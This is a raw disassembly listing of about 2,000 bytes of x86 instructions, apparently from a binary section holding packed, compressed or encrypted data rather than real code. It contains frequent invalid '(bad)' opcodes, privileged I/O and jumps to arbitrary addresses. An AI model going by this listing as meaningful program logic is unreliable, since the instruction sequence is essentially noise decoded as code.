  416175:	js     0x4161e8
  416177:	in     eax,dx
  416178:	punpckhwd mm6,QWORD PTR [edi+0x3757fb3b]
  41617f:	pop    ebp
  416180:	stos   BYTE PTR es:[di],al
  416182:	xchg   DWORD PTR [esi+eax*2+0x75c73ab],edx
  416189:	adc    dh,BYTE PTR [edi-0x53]
  41618c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41618d:	dec    ebp
  41618e:	ret    
  41618f:	mov    BYTE PTR [edi],ah
  416191:	dec    ecx
  416192:	ret    0xbe49
  416195:	arpl   WORD PTR [ecx],ax
  416197:	in     al,dx
  416198:	pop    ebx
  416199:	and    al,0x60
  41619b:	cmc    
  41619c:	aas    
  41619d:	out    0x93,al
  41619f:	out    dx,al
  4161a0:	cmp    BYTE PTR [ebp+0x2c],ch
  4161a3:	mov    edi,0x1e53c99f
  4161a8:	add    BYTE PTR [ebx],dh
  4161aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ab:	sahf   
  4161ac:	lds    esi,FWORD PTR [esi]
  4161ae:	xor    eax,0xad0856bb
  4161b3:	mov    eax,0xd9a3bd37
  4161b8:	mov    al,ds:0x28c14cf4
  4161bd:	dec    esp
  4161be:	lahf   
  4161bf:	sub    dl,BYTE PTR [edi+edx*4]
  4161c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161c3:	pop    eax
  4161c4:	mov    dh,0x24
  4161c6:	fiadd  DWORD PTR [ebx-0x2ca7add7]
  4161cc:	push   cs
  4161cd:	adc    eax,0xbb265845
  4161d2:	mov    cl,0x57
  4161d4:	and    DWORD PTR [ecx+0x18],0x4d13e0cd
  4161db:	xchg   edi,eax
  4161dc:	call   0x87fe5077
  4161e1:	enter  0x13fc,0x9
  4161e5:	(bad)  
  4161e6:	pop    ss
  4161e7:	xchg   esp,eax
  4161e8:	popa   
  4161e9:	les    esp,FWORD PTR [edx+edi*4-0x152be5a]
  4161f0:	(bad)  
  4161f1:	(bad)  
  4161f2:	adc    ebp,DWORD PTR [eax+0x7b0df056]
  4161f8:	cmp    eax,0x2717c144
  4161fd:	and    BYTE PTR ds:0x23e369a2,bh
  416203:	out    0x5b,eax
  416205:	mov    eax,0x5affea24
  41620a:	cmp    esp,esi
  41620c:	test   DWORD PTR [edi+edx*1],edx
  41620f:	add    BYTE PTR [edi+0xa],ch
  416212:	outs   dx,BYTE PTR ds:[esi]
  416213:	xor    eax,esi
  416215:	fisub  WORD PTR [ebp+ebp*4-0x5a3ff657]
  41621c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41621d:	(bad)  
  41621e:	pop    esi
  41621f:	call   0x2d33:0x97c8b0a1
  416226:	je     0x41624a
  416228:	cmc    
  416229:	psubsb mm2,QWORD PTR [edx-0x70c89932]
  416230:	ftst   
  416232:	xor    ebp,edi
  416234:	adc    bh,BYTE PTR [eax+0x71]
  416237:	dec    ebp
  416238:	mov    bh,0x86
  41623a:	lock adc ecx,DWORD PTR ds:0x7a4be3ac
  416241:	xchg   ebx,eax
  416242:	mov    ds:0x82c499ac,al
  416247:	xlat   BYTE PTR ds:[ebx]
  416248:	and    al,BYTE PTR cs:[ebx]
  41624b:	xor    al,cl
  41624d:	xor    BYTE PTR [esi-0x23],dh
  416250:	scas   eax,DWORD PTR es:[edi]
  416251:	mov    ds:0xa53f0272,al
  416256:	pop    eax
  416257:	jne    0x4161f5
  416259:	ja     0x4162d7
  41625b:	dec    esi
  41625c:	add    DWORD PTR [ebp-0x58],ebp
  41625f:	sar    BYTE PTR [eax],1
  416261:	sub    ebx,esi
  416263:	add    dl,BYTE PTR [esi+edx*8]
  416266:	lea    ebp,ds:0x10936300
  41626c:	add    bl,dh
  41626e:	fild   WORD PTR [ebp+0x32]
  416271:	stos   BYTE PTR es:[edi],al
  416272:	std    
  416273:	sar    esp,0x94
  416276:	in     eax,0x50
  416278:	ret    
  416279:	mov    al,ds:0x629294e6
  41627e:	push   0xd87225b0
  416283:	cmp    BYTE PTR [edi],ch
  416285:	pop    eax
  416286:	xchg   edi,eax
  416287:	(bad)  
  416288:	out    dx,al
  416289:	push   0x3b
  41628b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41628c:	arpl   WORD PTR [edx-0x3c],ax
  41628f:	mov    ch,0x5e
  416291:	xchg   ebp,eax
  416292:	ins    BYTE PTR es:[edi],dx
  416293:	popf   
  416294:	and    al,0x50
  416296:	jmp    0x687ea577
  41629b:	cmp    edx,DWORD PTR [ebx]
  41629d:	test   eax,0xbc69ce18
  4162a2:	daa    
  4162a3:	push   0x9a0fb98
  4162a8:	(bad)  
  4162a9:	int3   
  4162aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162ab:	jmp    0x3b2b:0x38ec40e4
  4162b2:	add    BYTE PTR [esi+0x34],ch
  4162b5:	inc    esp
  4162b6:	cwde   
  4162b7:	inc    edx
  4162b8:	mov    BYTE PTR [ebx+0x5ee963e2],bl
  4162be:	jecxz  0x4162f8
  4162c0:	es xchg ebx,eax
  4162c2:	pop    esp
  4162c3:	stos   DWORD PTR es:[edi],eax
  4162c4:	or     dh,BYTE PTR [ecx+0xe9088e7]
  4162ca:	arpl   dx,di
  4162cc:	dec    ecx
  4162cd:	jp     0x4162c7
  4162cf:	mov    bl,0xa6
  4162d1:	mov    ds:0x7b693afb,eax
  4162d6:	fwait
  4162d7:	cmc    
  4162d8:	repz mov eax,DWORD PTR [eax]
  4162db:	sub    al,0xec
  4162dd:	mov    esp,DWORD PTR [edi+0x43]
  4162e0:	inc    ebx
  4162e1:	and    DWORD PTR ss:[edx+0x78],ecx
  4162e5:	pop    esi
  4162e6:	shr    BYTE PTR [eax-0x72b43e15],0xe6
  4162ed:	mov    edx,0xe8575bda
  4162f2:	mov    esi,0x8f714c8e
  4162f7:	jle    0x4162f7
  4162f9:	(bad)  
  4162fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162fb:	xchg   ebp,eax
  4162fc:	(bad)  
  4162fd:	dec    ebp
  4162fe:	std    
  4162ff:	enter  0xde1e,0x24
  416303:	pop    ds
  416304:	push   0xf7f238c1
  416309:	daa    
  41630a:	pop    ds
  41630b:	lahf   
  41630c:	outs   dx,DWORD PTR ds:[esi]
  41630d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41630e:	mov    ah,0x54
  416310:	mov    ch,bl
  416312:	push   edi
  416313:	jp     0x4162da
  416315:	sub    al,0x6d
  416317:	cmp    bl,BYTE PTR [eax]
  416319:	je     0x416368
  41631b:	xchg   ecx,eax
  41631c:	pop    edi
  41631d:	pop    ebp
  41631e:	cmp    cl,BYTE PTR [esi]
  416320:	mov    edi,0xcd71ebdd
  416325:	data16 repnz and dl,BYTE PTR [edx-0x36c2c7f2]
  41632d:	scas   eax,DWORD PTR es:[edi]
  41632e:	and    eax,0x2e440b45
  416333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416334:	shl    ch,0xf9
  416337:	imul   ebx,DWORD PTR [eax-0x537e681],0x250b1ed3
  416341:	icebp  
  416342:	dec    ebx
  416343:	out    0x4d,eax
  416345:	xlat   BYTE PTR ds:[ebx]
  416346:	leave  
  416347:	fmul   QWORD PTR [esi+0x4e]
  41634a:	sub    DWORD PTR [esi+0x7541a772],esi
  416350:	in     al,dx
  416351:	leave  
  416352:	push   cs
  416353:	pop    ss
  416354:	ja     0x4163bf
  416356:	jo     0x4163b1
  416358:	repz pop esp
  41635a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41635b:	inc    esi
  41635c:	fdivr  st(3),st
  41635e:	outs   dx,BYTE PTR ds:[esi]
  41635f:	or     BYTE PTR [edi+0x59fffb6d],cl
  416365:	mov    esp,0x368b7b98
  41636a:	sub    bl,BYTE PTR [ebp+0x255de7a]
  416370:	sub    al,0x3f
  416372:	popf   
  416373:	addr16 and bl,dl
  416376:	popf   
  416377:	rcr    BYTE PTR [ecx+0x39],cl
  41637a:	cmp    eax,0x452125f7
  41637f:	xchg   edi,eax
  416380:	sar    BYTE PTR [edx],cl
  416382:	(bad)  
  416383:	xor    eax,0x57707a0c
  416388:	js     0x4163dc
  41638a:	mov    dl,0x64
  41638c:	mov    ds:0x72bfbbd6,al
  416391:	pop    ss
  416392:	mov    esp,0x32528e93
  416397:	dec    eax
  416398:	xchg   ecx,eax
  416399:	and    BYTE PTR [ecx+edi*4+0x65],bl
  41639d:	ds cli 
  41639f:	sub    DWORD PTR [edx+0x45],esi
  4163a2:	sbb    BYTE PTR [bx+si],bh
  4163a5:	test   al,0xd4
  4163a7:	gs push edx
  4163a9:	sbb    eax,ecx
  4163ab:	adc    BYTE PTR [edx-0x52f5484f],dh
  4163b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163b2:	mov    DWORD PTR [edx-0x63],eax
  4163b5:	adc    BYTE PTR [edi+0x69a185f7],al
  4163bb:	ds pop es
  4163bd:	pop    ds
  4163be:	mov    ebp,0x2c984c27
  4163c3:	jle    0x416363
  4163c5:	inc    edx
  4163c6:	jecxz  0x41637b
  4163c8:	(bad)  
  4163c9:	fstp   DWORD PTR [edx+0x51d5aafd]
  4163cf:	jno    0x41640a
  4163d1:	push   edx
  4163d2:	outs   dx,DWORD PTR ds:[esi]
  4163d3:	ret    
  4163d4:	fcmovnbe st,st(7)
  4163d6:	or     DWORD PTR [edi],ecx
  4163d8:	mov    ds,WORD PTR [edi+ebx*2+0xf]
  4163dc:	sbb    ah,BYTE PTR [esi+0x32]
  4163df:	pop    ss
  4163e0:	pop    ecx
  4163e1:	iret   
  4163e2:	push   ds
  4163e3:	ins    BYTE PTR es:[edi],dx
  4163e4:	sbb    eax,DWORD PTR [ebx+edi*4-0x3c44dc31]
  4163eb:	jnp    0x416461
  4163ed:	or     ch,cl
  4163ef:	adc    eax,0x533e3d3d
  4163f4:	outs   dx,DWORD PTR ds:[esi]
  4163f5:	xchg   DWORD PTR [eax+0x729525a2],esp
  4163fb:	lahf   
  4163fc:	mov    dl,0x69
  4163fe:	mov    al,0x27
  416400:	call   DWORD PTR [ecx-0x13]
  416403:	js     0x4163a2
  416405:	or     dh,BYTE PTR [ebx-0x3d]
  416408:	cmp    eax,0x1874f33d
  41640d:	xchg   DWORD PTR [edx-0x60d559c1],esp
  416413:	mov    edx,ss
  416415:	sbb    DWORD PTR [edi-0x316cf3e9],edx
  41641b:	cmp    BYTE PTR [ebx-0x5f],bl
  41641e:	jne    0x416477
  416420:	lock push esi
  416422:	cdq    
  416423:	inc    edi
  416424:	(bad)  
  416425:	mov    eax,ds:0x7981f616
  41642a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41642b:	out    dx,al
  41642c:	ret    0x787c
  41642f:	mov    WORD PTR [ebp-0xc],gs
  416432:	pusha  
  416433:	xor    al,0xd
  416435:	sbb    al,0x8c
  416437:	push   ss
  416438:	fistp  QWORD PTR [edx+0x15]
  41643b:	cdq    
  41643c:	dec    esp
  41643d:	int3   
  41643e:	push   edi
  41643f:	sbb    eax,0x173e0133
  416444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416445:	fwait
  416446:	imul   ecx,DWORD PTR [eax+0x64224c1],0x67
  41644d:	mov    dl,0x1c
  41644f:	out    0x25,al
  416451:	outs   dx,BYTE PTR ds:[esi]
  416452:	jb     0x41648f
  416454:	mov    esi,0xac72317c
  416459:	shr    BYTE PTR [ecx-0x3bf20552],cl
  41645f:	pop    ss
  416460:	icebp  
  416461:	(bad)  
  416462:	shr    DWORD PTR [ecx],1
  416464:	pop    ebx
  416465:	(bad)  
  416466:	sub    BYTE PTR [edx-0x2213bf6e],ch
  41646c:	mov    cl,0x2f
  41646e:	mov    ch,0x84
  416470:	sahf   
  416471:	adc    edx,ebx
  416473:	pop    ebx
  416474:	sqrtps xmm1,XMMWORD PTR [esi]
  416477:	pop    edx
  416478:	imul   ebp,DWORD PTR [esi],0x7c1bf0fe
  41647e:	pop    es
  41647f:	aam    0xe5
  416481:	daa    
  416482:	lock pop ecx
  416484:	sbb    BYTE PTR [edx+0x3ebaf338],bl
  41648a:	sbb    ecx,esp
  41648c:	push   ds
  41648d:	cld    
  41648e:	push   es
  41648f:	xchg   edi,eax
  416490:	dec    esp
  416491:	mul    BYTE PTR [edx+0x1f]
  416494:	repz sbb BYTE PTR [eax+0x14],dh
  416498:	xchg   esp,edx
  41649a:	push   ecx
  41649b:	sbb    DWORD PTR [esi+eiz*1-0x3b],ebx
  41649f:	mov    ds:0x11aa268,al
  4164a4:	adc    BYTE PTR [eax-0xc],cl
  4164a7:	mov    dh,0x22
  4164a9:	xor    DWORD PTR [edi+ecx*1],eax
  4164ac:	jl     0x416495
  4164ae:	sbb    eax,0x40a66dec
  4164b3:	ss data16 shl BYTE PTR fs:[edx],1
  4164b8:	push   ds
  4164b9:	imul   BYTE PTR [edx-0x2f99e820]
  4164bf:	popf   
  4164c0:	sbb    eax,0x2442694e
  4164c5:	add    dh,0xc4
  4164c8:	push   ecx
  4164c9:	es or  dl,al
  4164cc:	inc    edi
  4164cd:	and    DWORD PTR [ebp+0x1e],ebp
  4164d0:	mov    ds:0x9ee060c5,eax
  4164d5:	cmp    eax,0xd853ae2a
  4164da:	push   esp
  4164db:	retf   
  4164dc:	add    eax,DWORD PTR [esi]
  4164de:	int    0xa2
  4164e0:	xchg   ecx,eax
  4164e1:	inc    esi
  4164e2:	jb     0x4164bd
  4164e4:	adc    ch,ah
  4164e6:	lock gs dec esi
  4164e9:	sbb    BYTE PTR [edx+0x5311e036],bh
  4164ef:	pop    edx
  4164f0:	pop    ecx
  4164f1:	icebp  
  4164f2:	add    eax,0x9ae37435
  4164f7:	push   edi
  4164f8:	mov    dh,0xba
  4164fa:	xor    eax,0x6bd44b47
  4164ff:	mov    DWORD PTR [esi+edi*1-0x65],eax
  416503:	sbb    al,0x6
  416505:	or     eax,0x83ffb7ac
  41650a:	call   0x4cbd:0xf45cfaa2
  416511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416512:	mov    dl,0x26
  416514:	xor    dl,BYTE PTR [ecx-0x3231eccf]
  41651a:	mov    edx,0xdc4936a7
  41651f:	js     0x4164c3
  416521:	sub    edi,DWORD PTR [eax]
  416523:	retf   
  416524:	mov    ecx,es
  416526:	adc    eax,0xe9f8dca9
  41652b:	out    0xb3,al
  41652d:	in     eax,dx
  41652e:	push   esi
  41652f:	inc    esp
  416530:	sub    ch,cl
  416532:	adc    ch,al
  416534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416535:	int    0xdd
  416537:	sub    dl,BYTE PTR [esi]
  416539:	lods   eax,DWORD PTR ds:[esi]
  41653a:	pushf  
  41653b:	push   ebp
  41653c:	repz xchg edx,eax
  41653e:	push   edx
  41653f:	inc    edi
  416540:	out    dx,al
  416541:	js     0x4165a2
  416543:	push   0xb7473561
  416548:	xor    DWORD PTR [esi+0x46],ecx
  41654b:	cmp    bh,bh
  41654d:	test   ecx,0xd01b5608
  416553:	ds cmc 
  416555:	mov    ds:0x9691bf5f,eax
  41655a:	call   FWORD PTR [ebx]
  41655c:	call   DWORD PTR [esi]
  41655e:	inc    ebx
  41655f:	lea    eax,[ebx+0x36]
  416562:	ja     0x41654a
  416564:	sub    ch,BYTE PTR ds:0xe69efb69
  41656a:	aam    0xfb
  41656c:	pop    ss
  41656d:	and    BYTE PTR [ebx],0x5a
  416570:	sub    BYTE PTR [ecx+0x54],cl
  416573:	clc    
  416574:	sbb    BYTE PTR [ebx],dl
  416576:	or     eax,0x7cdea7a1
  41657b:	out    dx,al
  41657c:	outs   dx,BYTE PTR ds:[esi]
  41657d:	adc    eax,0x4f64f1f5
  416582:	jp     0x416535
  416584:	pop    ecx
  416585:	mov    al,ds:0xde7d961e
  41658a:	dec    edx
  41658b:	(bad)  
  41658c:	in     al,dx
  41658d:	repnz test BYTE PTR [edx+eax*1-0x5213688a],cl
  416595:	lahf   
  416596:	(bad)
  41659a:	or     eax,0xb677be9
  41659f:	fsubr  DWORD PTR [eax+0x10cb0f0b]
  4165a5:	xchg   edx,eax
  4165a6:	or     DWORD PTR [edx+edi*4-0x3f8952fd],ebx
  4165ad:	outs   dx,DWORD PTR ds:[esi]
  4165ae:	mov    ebx,0xbd524b93
  4165b3:	(bad)  
  4165b4:	daa    
  4165b5:	out    0x9b,eax
  4165b7:	les    ebp,FWORD PTR [edi-0x6c7b1bef]
  4165bd:	js     0x4165e5
  4165bf:	test   al,0x64
  4165c1:	scas   al,BYTE PTR es:[edi]
  4165c2:	sbb    eax,DWORD PTR [edi+0x10]
  4165c5:	adc    bl,dh
  4165c7:	xchg   ebx,eax
  4165c8:	ret    0x15d4
  4165cb:	dec    edx
  4165cc:	and    al,0x44
  4165ce:	cmp    eax,DWORD PTR [edx]
  4165d0:	in     al,0x34
  4165d2:	push   ds
  4165d3:	cmp    dl,BYTE PTR ds:0x91f62bcb
  4165d9:	push   esi
  4165da:	push   edx
  4165db:	mov    ds:0xa76dfcf5,al
  4165e0:	aam    0x93
  4165e2:	jecxz  0x41657e
  4165e4:	pop    edi
  4165e5:	fstp   QWORD PTR cs:[edx+0x32]
  4165e9:	ds dec ebp
  4165eb:	aaa    
  4165ec:	pop    edx
  4165ed:	lods   al,BYTE PTR ds:[esi]
  4165ee:	mov    esi,0xb76fdaaa
  4165f3:	mov    dh,0xc5
  4165f5:	pop    es
  4165f6:	lods   eax,DWORD PTR ds:[esi]
  4165f7:	xor    DWORD PTR ds:0xe8aaf023,ebx
  4165fd:	pusha  
  4165fe:	lock in eax,dx
  416600:	lods   eax,DWORD PTR ds:[esi]
  416601:	mov    edi,0x8149e2d9
  416606:	call   0x83bd36fa
  41660b:	push   0x8db2e023
  416610:	adc    BYTE PTR [edx+0x37],dl
  416613:	mov    ah,0x40
  416615:	loopne 0x4165ba
  416617:	or     BYTE PTR [ebp-0x1c36b3ff],cl
  41661d:	(bad)  
  41661e:	jns    0x4165d3
  416620:	fsub   QWORD PTR [ebp-0x1c]
  416623:	out    dx,al
  416624:	sbb    DWORD PTR [eax-0x4a],0x3897354d
  41662b:	mov    bl,0xc9
  41662d:	sar    BYTE PTR [esi+edi*4],1
  416630:	sbb    bh,BYTE PTR [edi]
  416632:	mov    eax,ds:0x136bcee
  416637:	mov    dl,0xc6
  416639:	mov    edi,0xdcaf70eb
  41663e:	scas   al,BYTE PTR es:[edi]
  41663f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416640:	fldenv [esi+0x5c]
  416643:	push   ds
  416644:	and    ah,BYTE PTR cs:[edx-0x28707dec]
  41664b:	cmp    ebp,DWORD PTR [ecx+0x76]
  41664e:	add    DWORD PTR [ecx+esi*1],ecx
  416651:	out    dx,al
  416652:	pop    edi
  416653:	outs   dx,BYTE PTR ds:[esi]
  416654:	xchg   edi,ebx
  416656:	stos   DWORD PTR es:[edi],eax
  416657:	dec    esp
  416658:	mov    eax,0x6a971389
  41665d:	outs   dx,BYTE PTR ds:[esi]
  41665e:	jo     0x416619
  416660:	jmp    0x4166ce
  416662:	mov    cs,ebx
  416664:	mov    ss,edx
  416666:	iret   
  416667:	jecxz  0x416641
  416669:	mov    WORD PTR [ebp+0x37],ds
  41666c:	in     al,0x4
  41666e:	sbb    edx,DWORD PTR [edx]
  416670:	inc    edx
  416671:	mov    edi,0xc956583
  416676:	and    BYTE PTR [edx-0x4e5596d0],0xf8
  41667d:	pop    ss
  41667e:	int    0xa
  416680:	shl    ebx,0xc2
  416683:	jmp    0x4166a1
  416685:	hlt    
  416686:	icebp  
  416687:	in     eax,0xd8
  416689:	xor    DWORD PTR [edx-0x55],ebp
  41668c:	mov    WORD PTR [ecx+0x41],cs
  41668f:	mov    esi,0xb0138676
  416694:	stc    
  416695:	jp     0x416663
  416697:	inc    eax
  416698:	push   es
  416699:	and    esi,edx
  41669b:	fiadd  DWORD PTR [edi]
  41669d:	or     BYTE PTR [eax],ah
  41669f:	add    BYTE PTR [eax],bh
  4166a1:	add    DWORD PTR [ecx],0x17
  4166a4:	cs out 0xc3,al
  4166a7:	or     al,0xb3
  4166a9:	lahf   
  4166aa:	(bad)  [esi-0x8]
  4166ad:	push   ebp
  4166ae:	mov    ecx,DWORD PTR [edi]
  4166b0:	outs   dx,BYTE PTR ds:[esi]
  4166b1:	(bad)  
  4166b2:	aas    
  4166b3:	in     eax,dx
  4166b4:	nop
  4166b5:	imul   edx,DWORD PTR ds:0x808d9349,0xa77e2f68
  4166bf:	sub    bh,BYTE PTR [ebx]
  4166c1:	add    esi,DWORD PTR [edi+eiz*1-0x49]
  4166c5:	ins    DWORD PTR es:[edi],dx
  4166c6:	xchg   esp,eax
  4166c7:	mov    dh,0xf7
  4166c9:	loopne 0x416716
  4166cb:	push   es
  4166cc:	adc    edi,DWORD PTR [ecx]
  4166ce:	sub    DWORD PTR [edx+0x2c],edx
  4166d1:	mov    ch,0x77
  4166d3:	jne    0x416750
  4166d5:	dec    edi
  4166d6:	or     cl,BYTE PTR [ebx+0x741908d0]
  4166dc:	xchg   BYTE PTR [ecx+0x584ea486],bh
  4166e2:	cmp    edx,eax
  4166e4:	cli    
  4166e5:	add    eax,edx
  4166e7:	push   0xffffffb8
  4166e9:	popf   
  4166ea:	rol    al,0x7f
  4166ed:	mov    dl,al
  4166ef:	loope  0x4166e9
  4166f1:	icebp  
  4166f2:	pop    es
  4166f3:	jmp    0xc986:0x787aba74
  4166fa:	mov    al,ds:0x49d40555
  4166ff:	hlt    
  416700:	aam    0xc4
  416702:	(bad)  
  416703:	je     0x41668e
  416705:	cmp    ebp,ebx
  416707:	and    eax,0xd0d572b4
  41670c:	pop    ds
  41670d:	sbb    BYTE PTR [edx-0x1e35cb0a],cl
  416713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416714:	imul   edx,esi,0x8698039c
  41671a:	lods   al,BYTE PTR ds:[esi]
  41671b:	lock and eax,0xcea7b32c
  416721:	inc    esp
  416722:	scas   al,BYTE PTR es:[edi]
  416723:	pop    ebx
  416724:	test   ebp,esp
  416726:	repz mov eax,0x51894e96
  41672c:	rcl    BYTE PTR [edi-0x3f],0x4c
  416730:	aad    0x60
  416732:	loopne 0x4166d3
  416734:	jle    0x4166be
  416736:	pop    ebx
  416737:	mov    edx,0xfb4f7e68
  41673c:	aad    0x86
  41673e:	pop    esp
  41673f:	ins    DWORD PTR es:[edi],dx
  416740:	push   esp
  416741:	mov    esp,ecx
  416743:	ins    BYTE PTR es:[edi],dx
  416744:	cmp    BYTE PTR [edx-0x5b],ch
  416747:	mov    eax,0x8858268
  41674c:	test   DWORD PTR [ebp-0x15],ecx
  41674f:	scas   al,BYTE PTR es:[edi]
  416750:	sbb    edi,DWORD PTR [esi+0x20]
  416753:	shl    DWORD PTR [ebp+0x1bb26c79],0xc5
  41675a:	pop    esp
  41675b:	pop    esi
  41675c:	sub    DWORD PTR [ebp+0x25],eax
  41675f:	in     al,dx
  416760:	test   al,0x21
  416762:	cld    
  416763:	push   ds
  416764:	jmp    0x4187:0x6c122658
  41676b:	shl    ebp,cl
  41676d:	mov    eax,0xae7ebf62
  416772:	sbb    al,0xc1
  416774:	xchg   ebp,ebx
  416776:	pop    ds
  416777:	clc    
  416778:	push   ebx
  416779:	rcr    BYTE PTR [esp+ebp*8+0xe],0x2a
  41677e:	in     eax,0x2b
  416780:	into   
  416781:	test   DWORD PTR [edi*2+0x256b71c2],0x4a5e4e33
  41678c:	ror    DWORD PTR [ebx-0x24],cl
  41678f:	loope  0x4167c3
  416791:	lods   eax,DWORD PTR ds:[esi]
  416792:	pop    edx
  416793:	xchg   BYTE PTR [edi-0x2f9a7dfc],ah
  416799:	ret    
  41679a:	pop    ecx
  41679b:	mov    DWORD PTR [esi-0x66],edx
  41679e:	inc    esp
  41679f:	xor    eax,0x43358d00
  4167a4:	lahf   
  4167a5:	mov    bh,ch
  4167a7:	mov    cs,ecx
  4167a9:	test   eax,0x8c2335c0
  4167ae:	pop    esp
  4167af:	scas   al,BYTE PTR es:[edi]
  4167b0:	xchg   BYTE PTR [ecx+0x4],ah
  4167b3:	(bad)  
  4167b4:	jle    0x4167a2
  4167b6:	icebp  
  4167b7:	mov    eax,ds:0x9fe84a4d
  4167bc:	fisubr DWORD PTR [edi-0x42]
  4167bf:	imul   eax,DWORD PTR [ebp+0x27e5cb0f],0x53
  4167c6:	lock ins BYTE PTR es:[edi],dx
  4167c8:	out    0xa1,al
  4167ca:	leave  
  4167cb:	sub    al,0xf1
  4167cd:	adc    bh,BYTE PTR [ecx+0x3e17b0c4]
  4167d3:	xchg   edx,eax
  4167d4:	lock repz sbb bh,bh
  4167d8:	fbld   TBYTE PTR [esi+0x78cd8b4b]
  4167de:	shr    DWORD PTR [ecx],0x15
  4167e1:	fsub   DWORD PTR [eax-0x3fd9d704]
  4167e7:	jae    0x4167b9
  4167e9:	stc    
  4167ea:	and    DWORD PTR [ebx+0x6a],ecx
  4167ed:	les    ebp,FWORD PTR [eax+0x46]
  4167f0:	xor    al,0x60
  4167f3:	pop    ss
  4167f4:	xchg   edx,eax
  4167f5:	lea    edx,[ecx-0x7e]
  4167f8:	sbb    cl,al
  4167fa:	loope  0x41677d
  4167fc:	mov    dh,0xd
  4167fe:	jmp    0x41685c
  416800:	sub    DWORD PTR [ebp+0x5b],ebp
  416803:	js     0x41685f
  416805:	nop
  416806:	xchg   esi,eax
  416807:	enter  0x16d9,0x46
  41680b:	xor    bl,BYTE PTR [ecx+0x43]
  41680e:	mov    al,0x3d
  416810:	popa   
  416811:	in     al,0xb0
  416813:	lods   al,BYTE PTR ds:[esi]
  416814:	cwde   
  416815:	mov    edx,0xcadc5798
  41681a:	cwde   
  41681b:	xor    DWORD PTR [edi-0x1e],edi
  41681e:	test   eax,0xf3ed45e1
  416823:	mov    ecx,0x1de2f8e5
  416828:	pop    esi
  416829:	into   
  41682a:	jl     0x416871
  41682c:	ja     0x41686f
  41682e:	popa   
  41682f:	addr16 push 0xe22857d6
  416835:	sub    DWORD PTR [edi-0x59],ebp
  416838:	or     ah,dh
  41683a:	mov    cl,0x21
  41683c:	in     al,0x28
  41683e:	popa   
  41683f:	push   esi
  416840:	in     eax,dx
  416841:	fldenv [ecx+0x2222403]
  416847:	add    DWORD PTR [ebx+0x7f485d29],0xdf322266
  416851:	aas    
  416852:	stc    
  416853:	icebp  
  416854:	mov    dh,0xd
  416856:	jg     0x416858
  416858:	(bad)  
  416859:	mov    al,cs:0xb2d76a6f
  41685f:	xlat   BYTE PTR ds:[ebx]
  416860:	loope  0x41680e
  416862:	int    0xc8
  416864:	dec    ebp
  416865:	dec    esp
  416866:	aas    
  416867:	mov    dl,0x3
  416869:	pop    es
  41686a:	sbb    eax,0x7e8feda6
  41686f:	vmread DWORD PTR [esi+0x27],ebx
  416873:	jg     0x41680a
  416875:	leave  
  416876:	cmp    BYTE PTR [edi],cl
  416878:	sub    eax,0xd0ab7599
  41687d:	inc    edx
  41687e:	adc    eax,0x6fcc538a
  416883:	lods   al,BYTE PTR ds:[esi]
  416884:	sub    ah,BYTE PTR [esi+0x5fc17f1c]
  41688a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41688b:	fimul  DWORD PTR [edi]
  41688d:	aas    
  41688e:	ds enter 0x48e2,0x6e
  416893:	xor    ecx,esp
  416895:	mov    edx,0x4a7af443
  41689a:	and    ch,bl
  41689c:	add    al,dh
  41689e:	test   al,0x20
  4168a0:	test   BYTE PTR [esi-0x3a299178],ch
  4168a6:	xchg   ch,ch
  4168a8:	or     BYTE PTR [ecx+0x66],al
  4168ab:	cld    
  4168ac:	sbb    DWORD PTR [ebp-0x6301af4f],edi
  4168b2:	xor    eax,0x66c31390
  4168b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b8:	enter  0x1349,0xb5
  4168bc:	dec    edi
  4168bd:	push   0xbd77c132
  4168c2:	int3   
  4168c3:	repz in al,0x49
  4168c6:	jno    0x41688f
  4168c8:	ds out 0xba,al
  4168cb:	and    eax,0x5457b0b4
  4168d0:	jl     0x4168d2
  4168d2:	cmc    
  4168d3:	popa   
  4168d4:	hlt    
  4168d5:	ficomp DWORD PTR ds:0x7cda19a1
  4168db:	ins    BYTE PTR es:[edi],dx
  4168dc:	lahf   
  4168dd:	cmp    edi,edi
  4168df:	or     eax,0x63bd3b70
  4168e4:	shr    edi,1
  4168e6:	aas    
  4168e7:	adc    DWORD PTR [ebp-0x63],edx
  4168ea:	addr16 call 0xa935f222
  4168f0:	std    
  4168f1:	dec    eax
  4168f2:	in     eax,dx
  4168f3:	ja     0x4168b5
  4168f5:	jl     0x416940
  4168f7:	mov    ds:0x619bad8b,eax
  4168fc:	add    DWORD PTR [ecx],edx
  4168fe:	lock jno 0x41692c
  416901:	cmp    ch,BYTE PTR [ecx+0x78]
  416904:	pop    eax
  416905:	ret    
  416906:	or     al,0xe4
  416908:	or     al,0xc6
  41690a:	mov    cl,0xcd
  41690c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41690d:	mov    edi,0xdd5f3a76
  416912:	or     ebp,ecx
  416914:	int3   
  416915:	jl     0x416976
  416917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416918:	mov    eax,0xcf4055c5
  41691d:	add    al,0xc2
  41691f:	pop    esp
  416920:	ins    DWORD PTR es:[edi],dx
  416921:	scas   eax,DWORD PTR es:[edi]
  416922:	mov    dl,0x5
  416924:	jecxz  0x41692b
  416926:	mov    ds:0x76c7db9a,eax
  41692b:	xor    DWORD PTR [eax-0x4de929c9],0x49
  416932:	(bad)  
  416933:	imul   edi,ecx,0xabd4908d
